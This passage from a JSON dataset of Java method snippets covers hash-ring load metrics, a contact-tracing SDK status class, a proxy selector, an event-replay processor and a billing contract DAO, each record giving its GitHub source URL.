null, "modifiers": ["public"], "return_type": "Set<T>", "snippet": "    public Set<T> locate(String key, int count) {\n        Set<T> nodes = target.locate(key, count);\n        nodes.forEach(n -> {\n            int cnt = loads.get(n);\n            loads.put(n, cnt + 1);\n            Set<T> prev = keys.computeIfAbsent(key, k -> new HashSet<>());\n            if (!prev.isEmpty() && !prev.contains(n)) {\n                missHits++;\n            }\n            prev.add(n);\n        });\n        return nodes;\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57316, "method_name": "size", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int size() {\n        return target.size();\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57317, "method_name": "printLoadDistribution", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printLoadDistribution() {\n        System.out.println();\n        System.out.println(\"################### LOAD DISTRIBUTION ###################\");\n        System.out.println(\"Name: \" + target.getName());\n        System.out.println(\"Consistent hash: \" + target.getClass().getName());\n        System.out.println(\"Hasher: \" + target.getHasher());\n        System.out.println(\"Partition Rate: \" + target.getPartitionRate());\n        System.out.println(\"Size: \" + target.size());\n        System.out.println(\"____________________________________________________\");\n        for (T node : loads.keySet()) {\n            System.out.println(\"Node [\" + node + \"] received: \" + loads.get(node) + \" hits\");\n        }\n        System.out.println(\"____________________________________________________\");\n        printExtrema();\n        printStandardDeviation();\n        System.out.println(\"____________________________________________________\");\n        System.out.println();\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57318, "method_name": "printMissHits", "class_name": "HashRingMetrics", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printMissHits(int reqCount) {\n        System.out.println();\n        System.out.println(\"########## MISS HITS ############\");\n        float percent = Math.round(missHits / (float) reqCount * 100);\n        System.out.println(\"Nodes miss: [\" + missHits + \"] hits. - \" + percent + \"%\");\n        System.out.println();\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57319, "method_name": "printExtrema", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printExtrema() {\n        int min = Integer.MAX_VALUE;\n        int max = Integer.MIN_VALUE;\n        for (Integer cnt : loads.values()) {\n            if (cnt < min) min = cnt;\n            if (cnt > max) max = cnt;\n        }\n        System.out.println(format(\"min: [%d] max: [%d], delta: [%d]\", min, max, max - min));\n        System.out.println(\"---\");\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57320, "method_name": "printStandardDeviation", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStandardDeviation() {\n        double avg = calculateArithmeticMean();\n        double dispersion = calculateDispersion(avg);\n        double standDev = Math.round(Math.sqrt(dispersion));\n        double standDevPercent = Math.round(standDev / avg * 100);\n        System.out.println(\"arithmetic mean: [\" + avg + \"] hits\");\n        System.out.println(\"stan. deviation: [\" + standDev + \"] hits - \" + standDevPercent + \"%\");\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57321, "method_name": "calculateDispersion", "class_name": "HashRingMetrics", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double calculateDispersion(double avg) {\n        double deviation = 0;\n        for (Integer cnt : loads.values()) {\n            deviation += Math.pow(avg - cnt, 2);\n        }\n        return Math.round(deviation / target.size());\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57322, "method_name": "calculateArithmeticMean", "class_name": "HashRingMetrics", "params": [], "throws": null, "modifiers": ["private"], "return_type": "double", "snippet": "    private double calculateArithmeticMean() {\n        float sum = 0;\n        for (Integer cnt : loads.values()) {\n            sum += cnt;\n        }\n        return Math.round(sum / target.size());\n    }", "url": "https://raw.githubusercontent.com/ishugaliy/allgood-consistent-hash/master/samples/src/main/java/org/ishugaliy/allgood/consistent/hash/samples/metrics/HashRingMetrics.java", "stars": "9", "class_props": {"extends": null, "implements": ["ConsistentHash"], "modifiers": ["public"]}}, {"id": 57323, "method_name": "getNumberOfContacts", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getNumberOfContacts() {\n\t\treturn numberOfContacts;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57324, "method_name": "isAdvertising", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isAdvertising() {\n\t\treturn advertising;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57325, "method_name": "isReceiving", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isReceiving() {\n\t\treturn receiving;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57326, "method_name": "getLastSyncDate", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getLastSyncDate() {\n\t\treturn lastSyncDate;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57327, "method_name": "getInfectionStatus", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "InfectionStatus", "snippet": "\tpublic InfectionStatus getInfectionStatus() {\n\t\treturn infectionStatus;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57328, "method_name": "getExposureDays", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ExposureDay>", "snippet": "\tpublic List<ExposureDay> getExposureDays() {\n\t\treturn exposureDays;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57329, "method_name": "getErrors", "class_name": "TracingStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<ErrorState>", "snippet": "\tpublic Collection<ErrorState> getErrors() {\n\t\treturn errors;\n\t}", "url": "https://raw.githubusercontent.com/DP-3T/dp3t-sdk-android/master-alpha/dp3t-sdk/sdk/src/main/java/org/dpppt/android/sdk/TracingStatus.java", "stars": "139", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57330, "method_name": "newInstance", "class_name": "TransactionsFragment", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "TransactionsFragment", "snippet": "    public static TransactionsFragment newInstance() {\n        return new TransactionsFragment();\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/TransactionsFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57331, "method_name": "onCreateView", "class_name": "TransactionsFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {\n        View v = inflater.inflate(R.layout.fragment_transactions, container, false);\n\n        mydb = new DBHelper(getActivity());\n        ArrayList array_list = mydb.getAllTransactions();\n\n        ArrayList<HashMap<String, String>> transList = new ArrayList<HashMap<String, String>>();\n        for (int i=0;i<array_list.size();i+=3)\n        {\n            HashMap<String, String> map = new HashMap <String, String>();\n            map.put(KEY_SENDER, array_list.get(i).toString());\n            map.put(KEY_RECEIVER, array_list.get(i+1).toString());\n            map.put(KEY_AMOUNT, array_list.get(i+2).toString());\n            transList.add(map);\n        }\n\n        Collections.reverse(transList);\n        list=(ListView)v.findViewById(R.id.listView1);\n\n        // Getting adapter by passing xml data ArrayList\n        adapter=new MyAdapter(getActivity(), transList);\n        list.setAdapter(adapter);\n\n        return v;\n    }", "url": "https://raw.githubusercontent.com/zhackerx/upi_payment/master/app/src/main/java/com/millionq/upi_payment/TransactionsFragment.java", "stars": "1", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 57332, "method_name": "getReturn", "class_name": "GetModeListResponse", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<DirectoryItem>", "snippet": "    public List<DirectoryItem> getReturn() {\n        if (_return == null) {\n            _return = new ArrayList<DirectoryItem>();\n        }\n        return this._return;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/ws/helpdesk/param/GetModeListResponse.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57333, "method_name": "install", "class_name": "IgnoreHostProxySelector", "params": ["String", "int"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void install(String hostToIgnore, int portToIgnore) {\n        ProxySelector defaultProxySelector = ProxySelector.getDefault();\n        ProxySelector ignoreHostProxySelector = new IgnoreHostProxySelector(defaultProxySelector, hostToIgnore, portToIgnore);\n        ProxySelector.setDefault(ignoreHostProxySelector);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 57334, "method_name": "select", "class_name": "IgnoreHostProxySelector", "params": ["URI"], "throws": null, "modifiers": ["public"], "return_type": "List<Proxy>", "snippet": "    public List<Proxy> select(URI uri) {\n        boolean ignored = hostToIgnore.equals(uri.getHost()) && portToIgnore == uri.getPort();\n        return ignored ? NO_PROXY_LIST : defaultProxySelector.select(uri);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 57335, "method_name": "connectFailed", "class_name": "IgnoreHostProxySelector", "params": ["URI", "SocketAddress", "IOException"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectFailed(URI uri, SocketAddress address, IOException failure) {\n        defaultProxySelector.connectFailed(uri, address, failure);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/IgnoreHostProxySelector.java", "stars": "2", "class_props": {"extends": "ProxySelector", "implements": null, "modifiers": []}}, {"id": 57336, "method_name": "test", "class_name": "Member", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test(final int param){\n        final String str = \"hello\";\n        class Inner {\n            public void innerMethod(){\n                System.out.println(\"Member a\" + a);\n                System.out.println(\"param \" + param);\n                System.out.println(\"str \" + str);\n            }\n        }\n        Inner inner = new Inner();\n        inner.innerMethod();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57337, "method_name": "main", "class_name": "Member", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        Member member = new Member();\n        member.test(100);\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57338, "method_name": "innerMethod", "class_name": "Inner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void innerMethod(){\n                System.out.println(\"Member a\" + a);\n                System.out.println(\"param \" + param);\n                System.out.println(\"str \" + str);\n            }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/javaMind/neibulei/Member.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 57339, "method_name": "startReplay", "class_name": "SwitchingEventProcessor", "params": ["TrackingToken", "ReplayMarkerEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void startReplay(TrackingToken startPosition, ReplayMarkerEvent replayMarkerEvent) {\n        synchronized (this) {\n            if (isReplaying()) {\n                throw new IllegalStateException(\"Cannot start replay while previous replay is still ongoing\");\n            }\n            LOGGER.info(\"Starting replay and switching to {}\",\n                    markerAwareTrackingEventProcessor.getClass().getSimpleName());\n            currentEventProcessor.shutDown();\n            currentEventProcessor = markerAwareTrackingEventProcessor;\n            markerAwareTrackingEventProcessor.startReplay(startPosition, replayMarkerEvent);\n            LOGGER.info(\"Replay started\");\n        }\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57340, "method_name": "stopReplay", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void stopReplay() {\n        synchronized (this) {\n            if (!isReplaying()) {\n                throw new IllegalStateException(\"Received request to stop replay but not currently in replay mode\");\n            }\n            LOGGER.info(\"Stopping replay and switching to {}\", subscribingEventProcessor.getClass().getSimpleName());\n            currentEventProcessor.shutDown();\n            LOGGER.info(\"shutdown completed\");\n            currentEventProcessor = subscribingEventProcessor;\n            start();\n            LOGGER.info(\"Stopped replay\");\n        }\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57341, "method_name": "registerReplayCompletionListener", "class_name": "SwitchingEventProcessor", "params": ["Consumer<ReplayableEventProcessor>"], "throws": null, "modifiers": ["public"], "return_type": "ListenerRegistry", "snippet": "    public ListenerRegistry registerReplayCompletionListener(Consumer<ReplayableEventProcessor> listener) {\n        return markerAwareTrackingEventProcessor.registerReplayCompletionListener(p -> listener.accept(this));\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57342, "method_name": "isReplaying", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isReplaying() {\n        return currentEventProcessor == markerAwareTrackingEventProcessor;\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57343, "method_name": "getName", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {\n        return currentEventProcessor.getName();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57344, "method_name": "getHandlerInterceptors", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<MessageHandlerInterceptor>", "snippet": "    public List<MessageHandlerInterceptor<? super EventMessage<?>>> getHandlerInterceptors() {\n        return currentEventProcessor.getHandlerInterceptors();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57345, "method_name": "start", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {\n        currentEventProcessor.start();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57346, "method_name": "shutDown", "class_name": "SwitchingEventProcessor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutDown() {\n        currentEventProcessor.shutDown();\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57347, "method_name": "registerHandlerInterceptor", "class_name": "SwitchingEventProcessor", "params": ["MessageHandlerInterceptor<EventMessage>"], "throws": null, "modifiers": ["public"], "return_type": "Registration", "snippet": "    public Registration registerHandlerInterceptor(MessageHandlerInterceptor<? super EventMessage<?>> handlerInterceptor) {\n        return currentEventProcessor.registerHandlerInterceptor(handlerInterceptor);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/main/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessor.java", "stars": "9", "class_props": {"extends": null, "implements": ["ReplayableEventProcessor"], "modifiers": ["public"]}}, {"id": 57348, "method_name": "onCreateViewHolder", "class_name": "notification_adapter", "params": ["ViewGroup", "int"], "throws": null, "modifiers": ["public"], "return_type": "notification_adapter", "snippet": "    public notification_adapter.notiholder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        return new notiholder(LayoutInflater.from(app).inflate(R.layout.onenotification,parent,false));\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57349, "method_name": "onBindViewHolder", "class_name": "notification_adapter", "params": ["notification_adapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(@NonNull notification_adapter.notiholder holder, int position) {\n        notification_data obj = data.get(position);\n        holder.t2.setText(obj.getRemark());\n        holder.t1.setText(obj.getFrom().toUpperCase()+\" REQUESTED \"+obj.getMsg());\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57350, "method_name": "getItemCount", "class_name": "notification_adapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return data.size();\n    }", "url": "https://raw.githubusercontent.com/AkhilRautela/ledger_system/master/app/src/main/java/com/example/ledgersystem/notification_adapter.java", "stars": "2", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 57351, "method_name": "getContractById", "class_name": "ContractDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "Contract", "snippet": "    public Contract getContractById(int contractId) throws BGException {\n        Contract result = null;\n\n        Request req = new Request();\n        req.setModule(CONTRACT_MODULE_ID);\n        req.setAction(\"FindContractByID\");\n        req.setAttribute(\"id\", contractId);\n\n        Document doc = transferData.postData(req, user);\n\n        for (Element contract : XMLUtils.selectElements(doc, \"/data/contracts/item\")) {\n            String title = contract.getAttribute(\"title\");\n            result = new Contract(dbInfo.getId(), contractId, StringUtils.substringBefore(title, \"[\").trim(),\n                    StringUtils.substringBetween(title, \"[\", \"]\").trim());\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57352, "method_name": "searchContractByTitleComment", "class_name": "ContractDAO", "params": ["SearchResult<IdTitle>", "String", "String", "SearchOptions"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByTitleComment(SearchResult<IdTitle> searchResult, String title, String comment, SearchOptions searchOptions)\n            throws BGException {\n        if (searchResult != null) {\n            Page page = searchResult.getPage();\n            List<IdTitle> contractList = searchResult.getList();\n\n            int pageIndex = page.getPageIndex();\n            int pageSize = page.getPageSize();\n\n            Request req = new Request();\n            req.setModule(CONTRACT_MODULE_ID);\n            req.setAction(\"FilterContract\");\n            req.setAttribute(\"filter\", 0);\n            applySearchOptions(searchOptions, req);\n            req.setAttribute(\"contractComment\", comment);\n            req.setAttribute(\"type\", -1);\n            req.setAttribute(\"contractMask\", title);\n            req.setAttribute(\"pageSize\", pageSize);\n            req.setAttribute(\"pageIndex\", pageIndex);\n\n            Document document = transferData.postData(req, user);\n\n            Element dataElement = document.getDocumentElement();\n            NodeList nodeList = dataElement.getElementsByTagName(\"item\");\n\n            for (int index = 0; index < nodeList.getLength(); index++) {\n                Element rowElement = (Element) nodeList.item(index);\n\n                contractList.add(new IdTitle(Utils.parseInt(rowElement.getAttribute(\"id\")), rowElement.getAttribute(\"title\")));\n            }\n\n            NodeList table = dataElement.getElementsByTagName(\"contracts\");\n            if (table.getLength() > 0) {\n                page.setRecordCount(Utils.parseInt(((Element) table.item(0)).getAttribute(\"recordCount\")));\n                page.setPageCount(Utils.parseInt(((Element) table.item(0)).getAttribute(\"pageCount\")));\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57353, "method_name": "updateContractDateTo", "class_name": "ContractDAO", "params": ["int", "Date"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateContractDateTo(int contractId, Date date) throws BGException {\n        Request request = new Request();\n        request.setAction(\"UpdateContractDate2\");\n        request.setModule(CONTRACT_MODULE_ID);\n        request.setContractId(contractId);\n        request.setAttribute(\"id\", contractId);\n        request.setAttribute(\"value\", TimeUtils.format(date, TimeUtils.PATTERN_DDMMYYYY));\n        transferData.postData(request, user);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57354, "method_name": "searchContractByObjectAddressParam", "class_name": "ContractDAO", "params": ["SearchResult<ParameterSearchedObject>", "SearchOptions", "Set<Integer>", "int", "String", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByObjectAddressParam(SearchResult<ParameterSearchedObject<Contract>> result, SearchOptions options,\n            Set<Integer> paramIds, int streetId, String house, String flat, String room) throws BGException {\n        final Page page = result.getPage();\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0)\n            req.setAttribute(\"type\", \"o4\");\n        else\n            req.setAttribute(\"type\", 14);\n        req.setAttribute(\"street\", streetId);\n\n        AddressHouse houseFrac = AddressHouse.extractHouseAndFrac(house);\n        req.setAttribute(\"house\", houseFrac.getHouse());\n        req.setAttribute(\"frac\", houseFrac.getFrac());\n        req.setAttribute(\"flat\", flat);\n        req.setAttribute(\"room\", room);\n\n        if (paramIds != null && paramIds.size() > 0) {\n            req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        }\n\n        setPage(req, page);\n\n        Document doc = transferData.postData(req, user);\n\n        Element contracts = XMLUtils.selectElement(doc, \"/data/contracts\");\n        if (contracts != null) {\n            getPage(page, contracts);\n\n            List<ParameterSearchedObject<Contract>> list = result.getList();\n            for (Element item : XMLUtils.selectElements(contracts, \"item\")) {\n                final String fullTitle = item.getAttribute(\"title\");\n\n                Contract contract = new Contract(dbInfo.getId(), Utils.parseInt(item.getAttribute(\"id\")),\n                        StringUtils.substringBefore(fullTitle, \"[\").trim(), StringUtils.substringBetween(fullTitle, \"[\", \"]\").trim());\n                list.add(new ParameterSearchedObject<Contract>(contract, 0, StringUtils.substringAfterLast(fullTitle, \"]\").trim()));\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57355, "method_name": "searchContractByAddressParam", "class_name": "ContractDAO", "params": ["SearchResult<AddressSearchedObject>", "SearchOptions", "Set<Integer>", "int", "String", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByAddressParam(SearchResult<AddressSearchedObject<Contract>> result, SearchOptions options, Set<Integer> paramIds,\n            int streetId, String house, String flat, String room) throws BGException {\n        final Page page = result.getPage();\n\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0)\n            req.setAttribute(\"type\", \"c2\");\n        else\n            req.setAttribute(\"type\", 2);\n        req.setAttribute(\"street\", streetId);\n\n        AddressHouse houseFrac = AddressHouse.extractHouseAndFrac(house);\n        req.setAttribute(\"house\", houseFrac.getHouse());\n        req.setAttribute(\"frac\", houseFrac.getFrac());\n        req.setAttribute(\"flat\", flat);\n        req.setAttribute(\"room\", room);\n        if (paramIds != null && paramIds.size() > 0) {\n            req.setAttribute(\"parameters\", Utils.toString(paramIds));\n        }\n        setPage(req, page);\n\n        Document doc = transferData.postData(req, user);\n\n        Element contracts = XMLUtils.selectElement(doc, \"/data/contracts\");\n        if (contracts != null) {\n            getPage(page, contracts);\n\n            List<AddressSearchedObject<Contract>> list = result.getList();\n            for (Element item : XMLUtils.selectElements(contracts, \"item\")) {\n                final String fullTitle = item.getAttribute(\"title\");\n\n                Contract contract = new Contract(dbInfo.getId(), Utils.parseInt(item.getAttribute(\"id\")),\n                        StringUtils.substringBefore(fullTitle, \"[\").trim(), StringUtils.substringBetween(fullTitle, \"[\", \"]\").trim());\n                list.add(new AddressSearchedObject<Contract>(contract, 0, StringUtils.substringAfterLast(fullTitle, \"]\").trim()));\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/ContractDAO.java", "stars": "12", "class_props": {"extends": "BillingDAO", "implements": null, "modifiers": ["public"]}}, {"id": 57356, "method_name": "searchContractByTextParam", "class_name": "ContractDAO", "params": ["SearchResult<Contract>", "SearchOptions", "Set<Integer>", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchContractByTextParam(SearchResult<Contract> result, SearchOptions options, Set<Integer> paramIds, String value)\n            throws BGException {\n        final Page page = result.getPage();\n\n        Request req = new Request();\n        req.setPage(page);\n        req.setModule(CONTRACT_MODULE_ID);\n\n        applySearchOptions(options, req);\n\n        req.setAction(\"FindContract\");\n        if (dbInfo.getVersion().compareTo(\"7.0\") >= 0)\n            